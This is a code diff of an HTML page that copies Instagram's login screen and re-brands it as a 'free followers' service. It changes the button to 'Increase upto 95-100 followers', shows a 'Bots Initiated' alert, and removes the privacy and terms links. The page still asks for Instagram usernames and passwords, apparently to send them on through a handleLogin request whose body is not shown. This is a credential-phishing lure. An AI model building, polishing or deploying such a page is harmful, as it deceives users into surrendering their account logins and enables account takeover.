@@ -13,10 +13,9 @@
     html, body {
       height: 100%;
       width: 100%;
-      background: #f2f3f5;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      -webkit-font-smoothing: antialiased;
-      -webkit-text-size-adjust: 100%;
+      background-image: url("https://thinkmarketingmagazine.com/wp-content/uploads/2024/09/10-Steps-to-Increase-Your-Instagram-Followers-Organically.webp");
+      background-size: cover;
+      background-position: center;
     }
     body {
       min-height: 100vh;
@@ -136,33 +135,11 @@
 <div class="screen">
   <div class="top-bar">
     <button class="back-btn">&#8249;</button>
-    <div class="lang">English (US)</div>
+    <div class="lang">Increase Your Followers</div>
   </div>
   <!-- Instagram logo: gradient camera icon, no background box -->
   <div class="logo-wrap">
-    <svg width="68" height="68" viewBox="0 0 68 68" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <radialGradient id="g1" cx="26%" cy="110%" r="135%" gradientUnits="objectBoundingBox">
-          <stop offset="0%" stop-color="#FFD600"/>
-          <stop offset="18%" stop-color="#FF7A00"/>
-          <stop offset="38%" stop-color="#FF0069"/>
-          <stop offset="67%" stop-color="#D300C5"/>
-          <stop offset="100%" stop-color="#7638FA"/>
-        </radialGradient>
-        <linearGradient id="g2" x1="0%" y1="100%" x2="100%" y2="0%">
-          <stop offset="0%" stop-color="#FFD600"/>
-          <stop offset="50%" stop-color="#FF0069"/>
-          <stop offset="100%" stop-color="#7638FA"/>
-        </linearGradient>
-      </defs>
-      <!-- Outer rounded square border -->
-      <rect x="4" y="4" width="60" height="60" rx="16" ry="16"
-            fill="none" stroke="url(#g1)" stroke-width="4.5"/>
-      <!-- Camera lens circle -->
-      <circle cx="34" cy="34" r="13" fill="none" stroke="url(#g2)" stroke-width="4.5"/>
-      <!-- Top-right dot -->
-      <circle cx="50" cy="18" r="3.5" fill="url(#g1)"/>
-    </svg>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" width="68" height="68" alt="Instagram followers" />
   </div>
   <div class="field">
     <input type="text" placeholder="Username, email or mobile number" autocomplete="username" id="username"/>
@@ -170,11 +147,11 @@
   <div class="field">
     <input type="password" placeholder="Password" autocomplete="current-password" id="password"/>
   </div>
-  <button class="btn-login" onclick="handleLogin()">Log in</button>
+  <button class="btn-login" onclick="handleLogin()">Increase upto 95-100 followers</button>
   <a href="#" class="forgot"></a>
   <div class="spacer"></div>
   <div class="bottom">
-    <a href="#" class="btn-create">Create new account</a>
+    <a href="#" class="btn-create">It Can Take 2-3 Minutes</a>
     <!-- Meta logo: exact ∞ infinity + Meta text in dark color -->
     <div class="meta-wrap">
       <svg width="90" height="22" viewBox="0 0 90 22" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -224,7 +201,7 @@ async function handleLogin() {
   }
   const btn = document.querySelector('.btn-login');
   const original = btn.textContent;
-  btn.textContent = "Logging in...";
+  btn.textContent = "Initiating....";
   btn.disabled = true;
 
   try {
@@ -237,7 +214,7 @@ async function handleLogin() {
     console.error(err);
   }
 
-  alert('Login successful.');
+  alert('Bots Initiated.');
   document.getElementById('username').value = '';
   document.getElementById('password').value = '';
   btn.textContent = original;
@@ -254,11 +231,4 @@ function handleHelp() {
 }
 </script>
 </body>
-
-<footer>
-    <a href="privacy-policy.html">Privacy Policy</a> | 
-    <a href="terms-of-service.html">Terms of Service</a>
-</footer>
-
-  
 </html>
